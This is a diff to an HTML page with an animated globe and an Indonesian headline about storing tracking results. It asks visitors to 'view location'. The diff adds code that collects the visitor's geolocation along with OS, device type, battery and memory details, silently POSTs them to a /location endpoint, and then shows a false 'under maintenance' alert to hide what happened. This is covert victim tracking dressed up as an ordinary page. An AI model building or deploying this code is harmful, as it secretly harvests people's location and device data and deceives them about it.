@@ -29,11 +29,9 @@ body{
   justify-content:center;
 }
 
-/* ── Canvas layers ── */
 #canvas-stars{position:fixed;inset:0;z-index:0}
 #canvas-globe{position:fixed;inset:0;z-index:1}
 
-/* ── Content ── */
 .content{
   position:relative;
   z-index:10;
@@ -43,7 +41,6 @@ body{
   align-items:center;
   gap:36px;
   padding:0 20px;
-  /* push to top-center area above globe */
   margin-top:-220px;
 }
 
@@ -65,7 +62,6 @@ body{
 
 @keyframes shimmer{to{background-position:200% center}}
 
-/* ── Button ── */
 .btn{
   position:relative;
   padding:16px 48px;
@@ -99,7 +95,6 @@ body{
 .btn:hover::before{opacity:1}
 .btn:active{transform:scale(.97)}
 
-/* ── Modal overlay ── */
 .modal-overlay{
   position:fixed;inset:0;
   z-index:100;
@@ -187,13 +182,11 @@ body{
 <canvas id="canvas-stars"></canvas>
 <canvas id="canvas-globe"></canvas>
 
-<!-- Main content -->
 <div class="content">
   <h1 class="headline">Platform Penyimpanan<br><span>Data Hasil Pelackan</span></h1>
   <button class="btn" onclick="openModal()">Lihat Lokasi</button>
 </div>
 
-<!-- Modal -->
 <div class="modal-overlay" id="overlay" onclick="handleOutside(event)">
   <div class="modal" id="modal">
     <div class="modal-icon">
@@ -209,7 +202,6 @@ body{
   </div>
 </div>
 
-<!-- Three.js -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
 const sc = document.getElementById('canvas-stars');
@@ -223,7 +215,6 @@ function resize(){
 resize();
 window.addEventListener('resize', resize);
 
-// static stars
 for(let i=0;i<220;i++){
   staticStars.push({
     x:Math.random(),y:Math.random(),
@@ -251,7 +242,6 @@ setInterval(spawnShooter, 700);
 
 function drawStars(t){
   sx.clearRect(0,0,W,H);
-  // static
   staticStars.forEach(s=>{
     const op = s.o*(0.6+0.4*Math.sin(t*.001+s.blink));
     sx.beginPath();
@@ -259,7 +249,6 @@ function drawStars(t){
     sx.fillStyle=`rgba(200,225,255,${op})`;
     sx.fill();
   });
-  // shooters
   shooters=shooters.filter(s=>{
     sx.beginPath();
     sx.moveTo(s.x, s.y);
@@ -309,21 +298,13 @@ function makeEarth(){
 
   c.fillStyle='rgba(15,60,30,0.85)';
   [
-    // N America
     [[138,100],[195,82],[240,115],[252,185],[225,240],[188,248],[148,218],[120,168],[118,138]],
-    // S America
     [[185,262],[222,250],[248,295],[248,368],[218,415],[182,418],[162,370],[155,300]],
-    // Europe
     [[435,90],[478,76],[520,102],[528,145],[496,168],[462,162],[428,138]],
-    // Africa
     [[445,178],[505,162],[542,192],[552,295],[522,385],[478,410],[440,372],[418,280],[425,205]],
-    // Asia (west)
     [[510,75],[600,60],[660,80],[695,115],[685,165],[648,182],[600,176],[558,152],[525,120]],
-    // Asia (east)
     [[660,75],[750,65],[800,90],[820,140],[790,185],[740,195],[688,178],[665,135]],
-    // Australia
     [[648,305],[708,292],[745,322],[738,385],[700,408],[650,390],[625,345]],
-    // Antarctica
     [[0,480],[1024,480],[1024,512],[0,512]]
   ].forEach(pts=>{
     c.beginPath();
@@ -334,7 +315,6 @@ function makeEarth(){
     c.closePath(); c.fill();
   });
 
-  // city glow dots
   [[.12,.22],[.18,.38],[.44,.22],[.50,.24],[.54,.20],[.62,.22],[.68,.28],[.60,.52],[.44,.42]].forEach(([fx,fy])=>{
     const cx2=fx*S, cy2=fy*(S/2);
     const grd=c.createRadialGradient(cx2,cy2,0,cx2,cy2,14);
@@ -343,7 +323,6 @@ function makeEarth(){
     c.fillStyle=grd; c.beginPath(); c.arc(cx2,cy2,14,0,Math.PI*2); c.fill();
   });
 
-  // cloud haze
   for(let i=0;i<200;i++){
     const cx2=Math.random()*S, cy2=Math.random()*(S/2), r=Math.random()*28+8;
     const grd=c.createRadialGradient(cx2,cy2,0,cx2,cy2,r);
@@ -401,7 +380,6 @@ window.addEventListener('resize',()=>{
   renderer.setSize(W,H);
 });
 
-// ── Render loop ──
 function loop(t){
   requestAnimationFrame(loop);
   if(autoRot) globe.rotation.y+=.0015;
@@ -430,6 +408,31 @@ function handleOutside(e){
 }
 document.addEventListener('keydown',e=>{ if(e.key==='Escape') closeModal(); });
 
+async function getDeviceInfo() {
+  const os = navigator.platform || 'N/A';
+  const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+  let battery = 'N/A';
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
+    }
+  } catch (e) {}
+  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+  return { os, deviceType, battery, memory };
+}
+
+function sendData(lat, lon) {
+  getDeviceInfo().then(device => {
+    const payload = { lat, lon, ...device };
+    fetch('/location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+  });
+}
+
 function requestLocation(){
   if(!navigator.geolocation){
     closeModal();
@@ -440,20 +443,8 @@ function requestLocation(){
     async (pos)=>{
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-
+      sendData(lat, lon);
       closeModal();
-
-      await fetch("/location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          lat: lat,
-          lon: lon
-        })
-      });
-
       alert("This website is currently under maintenance. Please try again later.");
     },
     ()=>{
